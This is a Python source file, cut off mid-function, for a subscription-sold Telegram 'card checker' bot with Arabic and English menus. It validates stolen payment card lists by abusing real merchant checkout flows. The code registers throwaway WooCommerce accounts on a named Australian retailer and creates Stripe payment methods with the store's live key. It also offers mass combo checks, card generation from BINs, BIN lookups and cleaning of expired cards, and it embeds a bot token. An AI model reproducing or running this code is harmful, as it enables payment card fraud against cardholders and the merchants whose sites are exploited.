import telebot
import time
import threading
import cloudscraper
from telebot import types
import requests
import random
import os
import pickle
import re
from bs4 import BeautifulSoup
import base64
from datetime import datetime, timedelta
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from user_agent import generate_user_agent
import urllib3
import io
import json
import string
import jwt
import uuid
import socket
import http.client
import httpx

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== تكوين البوت =====
token = "8960601362:AAFjiuXeKShV7l4e0FxOFYOofwuNWG5M4ck"
bot = telebot.TeleBot(token, parse_mode="HTML")

# ===== إعدادات الإدمن =====
ADMIN_IDS = [7981231554]
OWNER_USERNAME = "V_I8_P"
BINANCE_ID = ""

# ===== إعدادات بوابة Stripe 1 (Oak Furniture) =====
BASE = "https://oakfurniturecollection.com.au"
PK_KEY = "pk_live_51J2pNxEu26fcYXpGCSrbIAGae4tW6v7dGF8B1ml74aZ60hQocEdIQ4VMQGH4Kmb0N1oyQbWhky3jhdFyKM7J7V7j00Py3HVvgC"

# ===== إعدادات بوابة Stripe 2 (متعددة المواقع) =====
LINKS_LIST = [
    "https://www.alterabrand.com",
    "https://www.kidsafeuk.co.uk",
    "https://legacygames.com",
]

fake = Faker()

# ===== إعدادات الاشتراكات =====
SUBSCRIPTION_PRICES = {
    "daily": 3,
    "weekly": 15,
    "monthly": 35
}
SUBSCRIPTIONS_FILE = "subscriptions.json"

now = datetime.now()
current_year = now.year
current_month = now.month

stopuser = {}
user_checking_threads = {}
command_usage = {}
user_language = {}
scanning_sessions = {}
vbv_scanning_sessions = {}
stripe2_sessions = {}
vbv2_sessions = {}
sc_sessions = {}

# ===== قوائم اللغة =====
LANG = {
    "ar": {
        "welcome": "🎖️ مرحباً بك في Ali x CHECKER\n\nحيث الأساطيل تحترق بالنار 🎖️\n\nالإصدار ~ v2\nالمطور ~ 『Ali』",
        "gate": "🚪 البوابات المتاحة:\n\n✅ Stripe Auth (Oak Furniture)\n📌 للفحص اليدوي: <code>/st بطاقة</code>\nمثال: <code>/st 4111111111111111|12|26|123</code>\n\n✅ Stripe Multi-Site\n📌 للفحص اليدوي: <code>/st2 بطاقة</code>\nمثال: <code>/st2 4111111111111111|12|26|123</code>\n\n✅ VBV (Braintree)\n📌 للفحص اليدوي: <code>/vbv بطاقة</code>\nمثال: <code>/vbv 4555734017486848|09|30|286</code>\n\n✅ VBV V2 (Warren James)\n📌 للفحص اليدوي: <code>/vbv2 بطاقة</code>\nمثال: <code>/vbv2 4555734017486848|09|30|286</code>\n\n✅ Stripe Charge (ppool)\n📌 للفحص اليدوي: <code>/sc بطاقة</code>\nمثال: <code>/sc 4111111111111111|12|26|123</code>",
        "gates_mass": "📦 بوابات فحص الكمبو\n──────────────────\n✅ Stripe Auth (Oak Furniture)\n✅ Stripe Multi-Site\n✅ VBV (Braintree)\n✅ VBV V2 (Warren James)\n✅ Stripe Charge (ppool)\n──────────────────\n📌 طريقة الاستخدام:\nأرسل ملف txt ثم رد عليه بـ:\n<code>/nst</code> للفحص عبر Stripe\n<code>/nst2</code> للفحص عبر Stripe Multi-Site\n<code>/nvbv</code> للفحص عبر VBV\n<code>/nvbv2</code> للفحص عبر VBV V2\n<code>/nsc</code> للفحص عبر Stripe Charge\n\n📌 لإيقاف الفحص: <code>/stopst</code> أو <code>/stopst2</code> أو <code>/stopvbv</code> أو <code>/stopvbv2</code> أو <code>/stopsc</code>",
        "profile": "──────────────────\n👤 معلومات حسابك\n──────────────────\n🆔 الايدي: <code>{user_id}</code>\n👤 اليوزر: @{username}\n📛 الاسم: {name}\n──────────────────\n💎 حالة الاشتراك: {sub_status}\n🔍 الفحوصات المتبقية: {checks_left}\n──────────────────",
        "subscribe": "💎 نظام الاشتراكات\n\n📅 يومي: 3$\n📅 أسبوعي: 15$\n📅 شهري: 35$\n\n💳 التحويل عبر بينانس: <code>{binance}</code>\n📞 للشراء: @{owner}",
        "tools": "🛠️ الأدوات المتاحة\n\n⚡ <code>/gen BIN</code> - توليد 10 بطاقات\n📋 <code>/bin BIN</code> - معلومات BIN\n📁 <code>/kw</code> (رداً على ملف) - تقسيم الملف\n🧹 <code>/clean</code> (رداً على ملف) - تنظيف كروت منتهية\n\n📌 طريقة الاستخدام:\n• /gen 453744 - يولد 10 بطاقات من BIN\n• /bin 453744 - يعرض معلومات البنك\n• أرسل ملف txt ورد عليه بـ /kw لتقسيمه\n• أرسل ملف txt ورد عليه بـ /clean لتنظيف الكروت المنتهية",
        "owner": "👑 صاحب البوت\n\n👤 @{owner}",
        "group": "👥 جروبات البوت\n\n📌 انضم للجروب: @Sql_Dork",
        "no_sub": "⚠️ ليس لديك اشتراك نشط!\n\n💎 اشترك الآن:\n📅 يومي: 3$\n📅 أسبوعي: 15$\n📅 شهري: 35$\n\n💳 التحويل عبر بينانس: <code>{binance}</code>\n📞 بعد التحويل تواصل مع الدعم: @{owner}",
        "gen_title": "──────────────────\n🌟 نتيجة التوليد\n──────────────────\n🔢 BIN: <code>{bin}</code>\n📊 العدد: <code>10</code>\n──────────────────\n",
        "gen_usage": "❌ /gen 453744\nأدخل أول 6 أرقام",
        "gen_invalid": "❌ لازم أول 6 أرقام فقط",
        "gen_error": "❌ خطأ: {error}",
        "bin_usage": "❌ /bin 453744\nأدخل أول 6 أرقام",
        "bin_invalid": "❌ لازم أول 6 أرقام فقط",
        "bin_title": "──────────────────\n🔍 معلومات BIN\n──────────────────\n🔢 BIN: <code>{bin}</code>\n",
        "bin_info": "──────────────────\n💳 معلومات البطاقة\n──────────────────\n🏷️ الماركة: <code>{brand}</code>\n📌 النوع: <code>{type}</code>\n📊 المستوى: <code>{level}</code>\n🏦 البنك: <code>{bank}</code>\n🌍 الدولة: <code>{country} {flag}</code>\n──────────────────",
        "bin_no_info": "❌ لا توجد معلومات",
        "btn_gate": "🚪 Gate",
        "btn_gates_mass": "📦 Gates mass",
        "btn_killer": "💀 KILLER",
        "btn_profile": "👤 Profile",
        "btn_subscribe": "💎 Subscribe",
        "btn_tools": "🛠️ Tools",
        "btn_owner": "👑 Owner",
        "btn_group": "👥 Group",
        "btn_language": "🌐 اللغة",
        "btn_back": "🔙 رجوع",
        "choose_lang": "🌐 اختر لغتك:",
        "lang_set": "✅ تم اختيار اللغة العربية",
        "admin_only": "⛔ للأدمن فقط!",
        "confirm_usage": "⚠️ /confirm user_id daily/weekly/monthly\nمثال: /confirm 123456789 daily",
        "confirm_invalid": "❌ استخدم: daily, weekly, monthly",
        "confirm_done": "✅ تم تفعيل الاشتراك\n👤 {user}\n📅 الباقة: {plan}\n📅 ينتهي: {expiry}",
        "confirm_user": "──────────────────\n🎉 تم تفعيل اشتراكك!\n──────────────────\n💎 الباقة: {plan}\n📅 ينتهي: {expiry}\n✅ فحص غير محدود\n──────────────────",
        "help_text": "──────────────────\n❓ المساعدة\n──────────────────\n💎 الاشتراكات:\n/sub - عرض الحالة\n\n🔍 الفحص:\n/st بطاقة - فحص يدوي عبر Stripe\n/nst (رداً على ملف) - فحص كمبو عبر Stripe\n/st2 بطاقة - فحص يدوي عبر Stripe Multi-Site\n/nst2 (رداً على ملف) - فحص كمبو عبر Stripe Multi-Site\n/vbv بطاقة - فحص يدوي عبر VBV\n/nvbv (رداً على ملف) - فحص كمبو عبر VBV\n/vbv2 بطاقة - فحص يدوي عبر VBV V2\n/nvbv2 (رداً على ملف) - فحص كمبو عبر VBV V2\n/sc بطاقة - فحص يدوي عبر Stripe Charge\n/nsc (رداً على ملف) - فحص كمبو عبر Stripe Charge\n\n📁 الملفات:\n/clean (رداً على ملف) - تنظيف كروت منتهية\n/kw (رداً على ملف) - تقسيم الملف\n\n⚡ أخرى:\n/gen BIN - توليد 10 بطاقات\n/bin BIN - معلومات BIN\n\n💳 التحويل:\nبينانس: <code>{binance}</code>\n\n📞 الدعم: @{owner}\n──────────────────",
        "file_only_txt": "❌ يرجى إرسال ملف txt فقط",
        "file_error": "❌ خطأ: {error}",
        "split_start": "🔥 جاري التقسيم...",
        "split_done": "✅ تم التقسيم إلى {count} أجزاء",
        "split_error": "❌ خطأ: {error}",
        "clean_start": "🧹 جاري التنظيف...",
        "clean_done": "✅ تم التنظيف\n📊 الصالحة: {count}",
        "clean_no_cards": "❌ لا يوجد كروت صالحة",
        "clean_error": "❌ خطأ: {error}",
        "sub_active": "──────────────────\n💎 اشتراك نشط\n──────────────────\n📅 ينتهي: {expiry}\n⏳ متبقي: {days}يوم {hours}ساعة\n✅ فحص غير محدود\n──────────────────",
        "sub_plans": "──────────────────\n💎 باقات الاشتراك\n──────────────────\n📅 يومي: 3$\n📅 أسبوعي: 15$\n📅 شهري: 35$\n──────────────────\n💳 التحويل عبر بينانس\n🔑 <code>{binance}</code>\n──────────────────\n📞 بعد التحويل: @{owner}\n──────────────────",
        "file_wait": "🔥 جاري تحميل الملف...",
        "file_received": "──────────────────\n📁 تم استلام الملف\n──────────────────\n📄 الاسم: {name}\n──────────────────\n🔍 اختر بوابة الفحص:\n──────────────────",
        "file_checking": "⏳ جاري فحص الملف...",
        "file_stopped": "──────────────────\n⏹️ تم إيقاف الفحص\n──────────────────\n✅ المقبول: {passed}\n❌ المرفوض: {fail}\n📊 المجموع: {total}\n──────────────────",
        "file_done": "──────────────────\n✅ اكتمل الفحص\n──────────────────\n✅ المقبول: {passed}\n❌ المرفوض: {fail}\n📊 المجموع: {total}\n──────────────────"
    },
    "en": {
        "welcome": "🎖️ WELCOME TO Molotof x CHECKER\n\nWHERE LEGENDS BURN THROUGH FIRE 🎖️\n\nVersion ~ v2\nDev ~ 『Molotof』",
        "gate": "🚪 Available Gateways:\n\n✅ Stripe Auth (Oak Furniture)\n📌 Manual: <code>/st card</code>\nExample: <code>/st 4111111111111111|12|26|123</code>\n\n✅ Stripe Multi-Site\n📌 Manual: <code>/st2 card</code>\nExample: <code>/st2 4111111111111111|12|26|123</code>\n\n✅ VBV (Braintree)\n📌 Manual: <code>/vbv card</code>\nExample: <code>/vbv 4555734017486848|09|30|286</code>\n\n✅ VBV V2 (Warren James)\n📌 Manual: <code>/vbv2 card</code>\nExample: <code>/vbv2 4555734017486848|09|30|286</code>\n\n✅ Stripe Charge (ppool)\n📌 Manual: <code>/sc card</code>\nExample: <code>/sc 4111111111111111|12|26|123</code>",
        "gates_mass": "📦 Combo Check Gateways\n──────────────────\n✅ Stripe Auth (Oak Furniture)\n✅ Stripe Multi-Site\n✅ VBV (Braintree)\n✅ VBV V2 (Warren James)\n✅ Stripe Charge (ppool)\n──────────────────\n📌 How to use:\nSend txt file then reply with:\n<code>/nst</code> for Stripe\n<code>/nst2</code> for Stripe Multi-Site\n<code>/nvbv</code> for VBV\n<code>/nvbv2</code> for VBV V2\n<code>/nsc</code> for Stripe Charge\n\n📌 Stop: <code>/stopst</code> or <code>/stopst2</code> or <code>/stopvbv</code> or <code>/stopvbv2</code> or <code>/stopsc</code>",
        "profile": "──────────────────\n👤 Your Profile\n──────────────────\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{username}\n📛 Name: {name}\n──────────────────\n💎 Subscription: {sub_status}\n🔍 Checks left: {checks_left}\n──────────────────",
        "subscribe": "💎 Subscription Plans\n\n📅 Daily: 3$\n📅 Weekly: 15$\n📅 Monthly: 35$\n\n💳 : <code>{binance}</code>\n📞 Contact: @{owner}",
        "tools": "🛠️ Available Tools\n\n⚡ <code>/gen BIN</code> - Generate 10 cards\n📋 <code>/bin BIN</code> - BIN information\n📁 <code>/kw</code> (reply to file) - Split file\n🧹 <code>/clean</code> (reply to file) - Clean expired cards\n\n📌 How to use:\n• <code>/gen 453744</code> - Generates 10 cards from BIN\n• <code>/bin 453744</code> - Shows bank information\n• Send a txt file and reply with <code>/kw</code> to split it\n• Send a txt file and reply with <code>/clean</code> to clean expired cards",
        "owner": "👑 Bot Owner\n\n👤 @{owner}",
        "group": "👥 Bot Group\n\n📌 Join: @Sql_Dork",
        "no_sub": "⚠️ You don't have an active subscription!\n\n💎 Subscribe now:\n📅 Daily: 3$\n📅 Weekly: 15$\n📅 Monthly: 35$\n\n💳 Transfer via Binance: <code>{binance}</code>\n📞 Contact: @{owner}",
        "gen_title": "──────────────────\n🌟 Generated Result\n──────────────────\n🔢 BIN: <code>{bin}</code>\n📊 Amount: <code>10</code>\n──────────────────\n",
        "gen_usage": "❌ /gen 453744\nEnter first 6 digits",
        "gen_invalid": "❌ Must be 6 digits only",
        "gen_error": "❌ Error: {error}",
        "bin_usage": "❌ /bin 453744\nEnter first 6 digits",
        "bin_invalid": "❌ Must be 6 digits only",
        "bin_title": "──────────────────\n🔍 BIN Information\n──────────────────\n🔢 BIN: <code>{bin}</code>\n",
        "bin_info": "──────────────────\n💳 Card Info\n──────────────────\n🏷️ Brand: <code>{brand}</code>\n📌 Type: <code>{type}</code>\n📊 Level: <code>{level}</code>\n🏦 Bank: <code>{bank}</code>\n🌍 Country: <code>{country} {flag}</code>\n──────────────────",
        "bin_no_info": "❌ No information available",
        "btn_gate": "🚪 Gate",
        "btn_gates_mass": "📦 Gates mass",
        "btn_killer": "💀 KILLER",
        "btn_profile": "👤 Profile",
        "btn_subscribe": "💎 Subscribe",
        "btn_tools": "🛠️ Tools",
        "btn_owner": "👑 Owner",
        "btn_group": "👥 Group",
        "btn_language": "🌐 Language",
        "btn_back": "🔙 Back",
        "choose_lang": "🌐 Choose your language:",
        "lang_set": "✅ English language selected",
        "admin_only": "⛔ Admin only!",
        "confirm_usage": "⚠️ /confirm user_id daily/weekly/monthly\nExample: /confirm 123456789 daily",
        "confirm_invalid": "❌ Use: daily, weekly, monthly",
        "confirm_done": "✅ Subscription activated\n👤 {user}\n📅 Plan: {plan}\n📅 Expires: {expiry}",
        "confirm_user": "──────────────────\n🎉 Subscription Activated!\n──────────────────\n💎 Plan: {plan}\n📅 Expires: {expiry}\n✅ Unlimited checks\n──────────────────",
        "help_text": "──────────────────\n❓ Help\n──────────────────\n💎 Subscriptions:\n/sub - Check status\n\n🔍 Check:\n/st card - Manual Stripe check\n/nst (reply to file) - Combo Stripe check\n/st2 card - Manual Stripe Multi-Site check\n/nst2 (reply to file) - Combo Stripe Multi-Site check\n/vbv card - Manual VBV check\n/nvbv (reply to file) - Combo VBV check\n/vbv2 card - Manual VBV V2 check\n/nvbv2 (reply to file) - Combo VBV V2 check\n/sc card - Manual Stripe Charge check\n/nsc (reply to file) - Combo Stripe Charge check\n\n📁 Files:\n/clean (reply to file) - Clean expired cards\n/kw (reply to file) - Split file\n\n⚡ Other:\n/gen BIN - Generate 10 cards\n/bin BIN - BIN info\n\n💳 Transfer:\nBinance: <code>{binance}</code>\n\n📞 Support: @{owner}\n──────────────────",
        "file_only_txt": "❌ Please send a txt file only",
        "file_error": "❌ Error: {error}",
        "split_start": "🔥 Splitting...",
        "split_done": "✅ Split into {count} parts",
        "split_error": "❌ Error: {error}",
        "clean_start": "🧹 Cleaning...",
        "clean_done": "✅ Cleaned\n📊 Valid cards: {count}",
        "clean_no_cards": "❌ No valid cards found",
        "clean_error": "❌ Error: {error}",
        "sub_active": "──────────────────\n💎 Active Subscription\n──────────────────\n📅 Expires: {expiry}\n⏳ Remaining: {days}d {hours}h\n✅ Unlimited checks\n──────────────────",
        "sub_plans": "──────────────────\n💎 Subscription Plans\n──────────────────\n📅 Daily: 3$\n📅 Weekly: 15$\n📅 Monthly: 35$\n──────────────────\n💳 Transfer via Binance\n🔑 <code>{binance}</code>\n──────────────────\n📞 After transfer: @{owner}\n──────────────────",
        "file_wait": "🔥 Downloading file...",
        "file_received": "──────────────────\n📁 File received\n──────────────────\n📄 Name: {name}\n──────────────────\n🔍 Choose gateway:\n──────────────────",
        "file_checking": "⏳ Checking file...",
        "file_stopped": "──────────────────\n⏹️ Check stopped\n──────────────────\n✅ Approved: {passed}\n❌ Declined: {fail}\n📊 Total: {total}\n──────────────────",
        "file_done": "──────────────────\n✅ Check completed\n──────────────────\n✅ Approved: {passed}\n❌ Declined: {fail}\n📊 Total: {total}\n──────────────────"
    }
}

def get_text(user_id, key, **kwargs):
    lang = user_language.get(str(user_id), "ar")
    text = LANG.get(lang, LANG["ar"]).get(key, key)
    if kwargs:
        return text.format(**kwargs)
    return text

def get_btn_text(user_id, key):
    return get_text(user_id, key)

# ===== دوال الصور =====
def get_random_image():
    folder = "images"
    if not os.path.exists(folder):
        return None
    images = [f for f in os.listdir(folder) if f.endswith(('.jpg', '.jpeg', '.png', '.webp'))]
    if not images:
        return None
    return os.path.join(folder, random.choice(images))

# ===== مدير الاشتراكات =====
class SubscriptionManager:
    def __init__(self):
        self.subscriptions = {}
        self.load_data()
        
    def load_data(self):
        if os.path.exists(SUBSCRIPTIONS_FILE):
            try:
                with open(SUBSCRIPTIONS_FILE, 'r') as f:
                    self.subscriptions = json.load(f)
            except:
                self.subscriptions = {}
        else:
            self.subscriptions = {}
    
    def save_data(self):
        with open(SUBSCRIPTIONS_FILE, 'w') as f:
            json.dump(self.subscriptions, f, indent=4)
    
    def get_subscription(self, user_id):
        user_id = str(user_id)
        if user_id in self.subscriptions:
            expiry = datetime.fromisoformat(self.subscriptions[user_id])
            if expiry > datetime.now():
                return self.subscriptions[user_id]
            else:
                del self.subscriptions[user_id]
                self.save_data()
                return None
        return None
    
    def add_subscription(self, user_id, days):
        user_id = str(user_id)
        expiry = datetime.now() + timedelta(days=days)
        self.subscriptions[user_id] = expiry.isoformat()
        self.save_data()
        return expiry
    
    def is_subscribed(self, user_id):
        return self.get_subscription(user_id) is not None

subscription_manager = SubscriptionManager()

# ===== دوال التوثيق =====
def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            pass
        elif len(yy) == 1:
            return None
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None

        return f"{pan}|{mm}|{yy}|{cvc}"

    digits = ''.join(re.findall(r'\d', cc))
    if not digits:
        return None

    is_amex = digits.startswith('34') or digits.startswith('37')
    cvc_len = 4 if is_amex else 3
    min_len = (15 if is_amex else 16) + 2 + 2 + cvc_len
    
    if len(digits) < min_len:
        return None

    cvc = digits[-cvc_len:]
    rest = digits[:-cvc_len]

    yy_candidate = rest[-2:]
    mm_candidate = rest[-4:-2]
    pan_candidate = rest[:-4]

    if len(rest) >= 6 and rest[-4:-2] in ('20', '19'):
        yy = rest[-4:]
        mm = rest[-6:-4]
        pan = rest[:-6]
    else:
        yy = yy_candidate
        mm = mm_candidate
        pan = pan_candidate

    mm = mm.zfill(2)

    expected_pan_len = 15 if (pan.startswith('34') or pan.startswith('37')) else 16
    if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
        return None
    if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
        return None
    if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
        return None
    if not re.fullmatch(r'\d{%d}' % cvc_len, cvc):
        return None
    if not luhn_check(pan):
        return None

    return f"{pan}|{mm}|{yy}|{cvc}"

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        return {"brand": brand, "type": card_type, "level": level, "bank": bank, "country": country_name, "flag": country_flag}
    except Exception as e:
        print(e)
        return None

# ===== دوال التقسيم والتنظيف =====
def split_txt_file(file_path, chunk_size=300):
    parts = []
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    total_lines = len(lines)
    for i in range(0, total_lines, chunk_size):
        part_lines = lines[i:i+chunk_size]
        part_file = f"{file_path}_part_{i//chunk_size + 1}.txt"
        with open(part_file, 'w', encoding='utf-8') as f:
            f.writelines(part_lines)
        parts.append(part_file)
    return parts, total_lines

def clean_expired_cards(text_content):
    lines = text_content.split('\n')
    valid_numbers = []
    for line in lines:
        match = re.search(r'\b(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b', line.strip())
        if match:
            month = int(match.group(2))
            year_str = match.group(3)
            if len(year_str) == 2:
                full_year = 2000 + int(year_str)
            else:
                full_year = int(year_str)
            is_valid = False
            if full_year > current_year:
                is_valid = True
            elif full_year == current_year:
                if month >= current_month:
                    is_valid = True
            if is_valid:
                valid_numbers.append(match.group())
    return valid_numbers

# ======================================================
# ===== دوال بوابة Stripe 1 (Oak Furniture) =====
# ======================================================

def create_session():
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    return s

def get_nonce(url, pattern, session, headers=None):
    headers = headers or {}
    r = session.get(url, headers=headers)
    if r.status_code != 200:
        return None
    m = re.search(pattern, r.text)
    return m.group(1) if m else None

def register_account(session, email):
    register_nonce = get_nonce(
        f"{BASE}/my-account/add-payment-method/",
        r'name="_wpnonce"[^>]*value="([^"]+)"',
        session,
        headers={'referer': f'{BASE}/my-account/add-payment-method/'}
    )
    if not register_nonce:
        return False
    params = {'action': 'register'}
    data = {
        'email': email, 'email_2': '', 'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)', 'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)', 'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)', 'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)', 'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': f'{BASE}/my-account/add-payment-method',
        'wc_order_attribution_session_pages': '2', 'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': session.headers.get('User-Agent'),
        '_wpnonce': register_nonce, '_wp_http_referer': '/my-account/add-payment-method', 'register': 'Register',
    }
    r = session.post(f"{BASE}/my-account/", params=params, data=data, headers={'referer': f'{BASE}/my-account/add-payment-method/'})
    return r.status_code in (200, 302)

def post_billing_address(session, email):
    url = f"{BASE}/my-account/edit-address/billing/"
    r = session.get(url, headers={'referer': f'{BASE}/my-account/edit-address/'})
    if r.status_code != 200:
        return False
    m = re.search(r'name="woocommerce-edit-address-nonce"[^>]*value="([^"]+)"', r.text)
    address_nonce = m.group(1) if m else None
    if not address_nonce:
        return False
    data = {
        'billing_first_name': 'mama', 'billing_last_name': 'Baba', 'billing_company': '',
        'billing_country': 'AU', 'billing_address_1': '46 Trelawney Street', 'billing_address_2': '',
        'billing_city': 'Banksmeadow', 'billing_state': 'NSW', 'billing_postcode': '2019',
        'billing_phone': '(02) 9598 6159', 'billing_email': email, 'save_address': 'Save address',
        'woocommerce-edit-address-nonce': address_nonce, '_wp_http_referer': '/my-account/edit-address/billing',
        'action': 'edit_address',
    }
    r2 = session.post(url, headers={'origin': BASE, 'referer': url}, data=data)
    return r2.status_code in (200, 302)

def get_add_payment_page_and_nonces(session):
    url = f"{BASE}/my-account/add-payment-method/"
    r = session.get(url, headers={'referer': f'{BASE}/my-account/payment-methods/'})
    if r.status_code != 200:
        return None, None
    create_nonce_m = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', r.text)
    create_nonce = create_nonce_m.group(1) if create_nonce_m else None
    return None, create_nonce

def create_stripe_payment_method(card_number, exp_month, exp_year, cvc, email, pk_key):
    headers = {
        'authority': 'api.stripe.com', 'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    data = {
        "type": "card", "card[number]": card_number, "card[cvc]": cvc,
        "card[exp_year]": exp_year, "card[exp_month]": exp_month,
        "allow_redisplay": "unspecified", "billing_details[address][postal_code]": "10080",
        "billing_details[address][country]": "US",
        "payment_user_agent": "stripe.js/5507c504c1; stripe-js-v3/5507c504c1; payment-element; deferred-intent",
        "referrer": BASE, "key": pk_key,
    }
    resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
    return resp

def attach_payment_method_to_site(session, pmid, ajax_nonce):
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pmid,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    headers = {
        'authority': 'oakfurniturecollection.com.au', 'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': BASE, 'referer': f'{BASE}/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    r = session.post(f"{BASE}/wp-admin/admin-ajax.php", headers=headers, data=data)
    return r

def check_bin_stripe(bin_number, session):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        resp = session.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "level": data.get("level", "Unknown"), "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"), "bank": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown"), "flag": data.get("country_flag", "🏳️"),
                "bin": bin_number
            }
    except Exception:
        pass
    return None

def format_stripe_result(status, num, mon, year2, cvc, elapsed, bin_info, result_type):
    if result_type == "approved":
        title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
        response = "<code>succeeded</code>"
    elif result_type == "declined":
        title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
        response = f"<code>{status}</code>" if status and "❌" not in status else "<code>declined</code>"
    else:
        title = "⚠️ System Error"
        response = f"<code>{status}</code>"
    
    if bin_info:
        bin_line = f"{bin_info['bin']} - {bin_info['type']} - {bin_info['brand']} - {bin_info['level']}"
        bank_line = f"{bin_info['bank']}"
        country_line = f"{bin_info['country']} - {bin_info['flag']}"
    else:
        bin_line = "N/A"
        bank_line = "N/A"
        country_line = "N/A - 🏳️"
    
    return (f"{title}\n\n"
            f"𝐂𝐚𝐫𝐝 ➙ <code>{num}|{mon}|20{year2}|{cvc}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Stripe Auth\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ {response}\n\n"
            f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙ : {bin_line}\n"
            f"𝐁𝐚𝐧𝐤 ➙ {bank_line}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙ {country_line}\n\n"
            f"𝗧𝗼𝗼𝗸 : <code>{elapsed}</code> (seconds) PREMIUM")

def scan_single_card_stripe(num, mon, year2, cvc):
    s = create_session()
    fake = Faker()
    email = f"{fake.first_name()}{fake.last_name()}{random.randint(10,99)}@gmail.com"
    start_time = time.time()
    
    num_clean = num.replace(' ', '')
    bin_number = num_clean[:6] if len(num_clean) >= 6 else "N/A"
    bin_info = check_bin_stripe(bin_number, s) if bin_number != "N/A" else None
    
    if not register_account(s, email):
        return format_stripe_result("System Error", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "system_error")
    if not post_billing_address(s, email):
        return format_stripe_result("System Error", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "system_error")
    
    _, create_nonce = get_add_payment_page_and_nonces(s)
    if not create_nonce:
        return format_stripe_result("System Error", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "system_error")
    
    resp = create_stripe_payment_method(num, mon, f"20{year2}", cvc, email, PK_KEY)
    try:
        j = resp.json()
    except:
        return format_stripe_result("Invalid Stripe response", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "declined")
    
    if not j or 'id' not in j:
        err = j.get('error', {}).get('message', 'Unknown') if j else 'No response'
        return format_stripe_result(f"{err}", num_clean, mon, year2, cvc, round(time.time() - start_time, 2), bin_info, "declined")
    
    pmid = j.get('id')
    attach_resp = attach_payment_method_to_site(s, pmid, create_nonce)
    
    try:
